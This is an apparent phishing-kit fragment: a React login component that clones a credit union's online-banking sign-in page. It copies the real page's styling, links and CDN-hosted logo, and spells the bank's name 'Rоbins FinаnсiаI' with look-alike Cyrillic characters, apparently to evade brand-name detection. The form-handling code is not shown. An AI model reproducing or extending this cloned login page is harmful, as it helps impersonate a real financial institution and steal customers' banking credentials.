...
export const Login: React.FC<LoginProps> = ({}) => {
  ...
  useEffect(() => {
    ...
    html?.setAttribute(
      `class`,
      `js flexbox fontface objectfit object-fit csspositionsticky cssreflections no-regions cssresize shapes siblinggeneral subpixelfont supports csstransforms3d preserve3d canvas canvastext emoji devicemotion deviceorientation svg svgasimg svgclippaths svgfilters svgforeignobject inlinesvg smil no-touchevents typedarrays uagent-chrome uagent-webkit uagent-osOsx`
    );

    html!.style.backgroundImage = `url(/images/desktop-background-78b95e19d363e7d201a42c657ddde12e.jpeg)`;

    const body = document.querySelector(`body`);
    body?.setAttribute(`class`, `ember-application desktop theme-q2 frameless`);
                ...
                <div className="valign overpanel-footer-outer">
                  <div className="overpanel-footer-inner">
                    <div id="ember10" className="ui-logo small ember-view">
                      <span className="sr-only">Rоbins FinаnсiаI</span>
                ...
                <div className="login-outer">
                  <div className="login-inner" id="login-inner">
                    ...
                    <div className="login-title">
                      <h1 id="ember33" className="ui-logo large ember-view">
                        <span className="sr-only">Rоbins FinаnсiаI</span>
                        <div aria-hidden="true" className="logo-image" />
                      </h1>
                    </div>
                    ...
                    <div className="login-icons clearfix">
                      {/**/}
                      {/**/} <a className="login-adLink">Enroll Now</a>
                      <a className="login-adLink">Forgot/Unlock Login ID</a>
                      <a className="login-adLink">Digital Banking Guide</a>
                    ...
                    <a rel="noopener">
                      <img
                        src="https://cdn1.onlineaccess1.com/cdn/depot/5086/375/8f886a882457c44975537406b896de3f/assets/images/ncua_logo_small-b690f247c19ea4970c9d08b2b479f16a.png"
                        alt=""
                      />
                    </a>
                  </div>
